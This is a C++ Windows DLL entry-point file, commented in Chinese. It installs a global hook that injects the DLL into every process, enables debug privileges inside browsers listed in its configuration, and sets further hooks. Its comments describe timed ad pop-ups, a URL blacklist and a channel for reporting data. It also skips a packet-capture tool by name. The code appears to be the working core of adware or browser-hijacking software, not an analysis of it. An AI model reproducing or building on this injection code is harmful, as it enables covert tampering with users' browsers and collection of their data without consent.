// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "stdafx.h"
#include "Kernel.h"

#pragma data_seg("mshared")
extern HWND g_hWnd = NULL;	//发送数据上报消息
extern int g_nInterval = 0;	//广告弹出时间间隔，秒
extern int g_nLastTime = 0;		//广告上次显示时间，秒
extern CHAR g_strBkurl[256] = { 0 };		//黑名单
extern CHAR g_strBrowsers[256] = { 0 };		//支持浏览器列表
#pragma data_seg()
#pragma comment(linker,"/section:mshared,RWS")

static HHOOK g_foregroundidle_hook = NULL;

BOOL PromoteProcessPrivileges()//提升当前进程权限
{
	HANDLE hToken = NULL;
	BOOL bFlag = FALSE;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid)) {
			CloseHandle(hToken);
			return FALSE;
		}

		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
			CloseHandle(hToken);
			return FALSE;
		}
	}

	CloseHandle(hToken);

	return TRUE;
}

static LRESULT CALLBACK hook_proc(int code, WPARAM wparam, LPARAM lparam)
{
	return CallNextHookEx(g_foregroundidle_hook, code, wparam, lparam);
}

extern "C" BOOL __stdcall InstallHook(HMODULE hModu)
{
	g_foregroundidle_hook = SetWindowsHookEx(WH_CBT, hook_proc, hModu, 0);

	return TRUE;
}

extern "C" BOOL __stdcall UnInstallHook()
{
	UnhookWindowsHookEx(g_foregroundidle_hook);

	return TRUE;
}

extern "C" BOOL __stdcall SetDataSeg(HWND hWnd, int nInterval, char* strBkurl, char* strBrowsers)
{
	g_hWnd = hWnd;
	g_nInterval = nInterval;
	strcpy_s(g_strBkurl, strBkurl);
	strcpy_s(g_strBrowsers, strBrowsers);

	return TRUE;
}

BOOL IsBrowser(LPTSTR lpApplicationName)
{
	CString strPath = lpApplicationName;
	strPath = strPath.Right(strPath.GetLength() - strPath.ReverseFind('\\') - 1);
	strPath.MakeLower();

	CString strBrowserList = g_strBrowsers;
	strBrowserList.MakeLower();

	if (strBrowserList.Find(strPath) >= 0) {
		return TRUE;
	}

	return FALSE;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	TCHAR szProcName[MAX_PATH] = { 0 };
	GetModuleFileName(NULL, szProcName, MAX_PATH);

	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		DisableThreadLibraryCalls(hModule);
		if (_tcsstr(szProcName, TEXT("\\CapPacket.exe"))) {
			return TRUE;
		}
		if (IsBrowser(szProcName)) {
			PromoteProcessPrivileges();
			CKernel::Init();
			CKernel::SetHook();
		} else {
			return FALSE;
		}

		break;
	case DLL_PROCESS_DETACH:
		if (IsBrowser(szProcName)) {
			CKernel::UnHook();
		}
		break;
	}
	return TRUE;
}

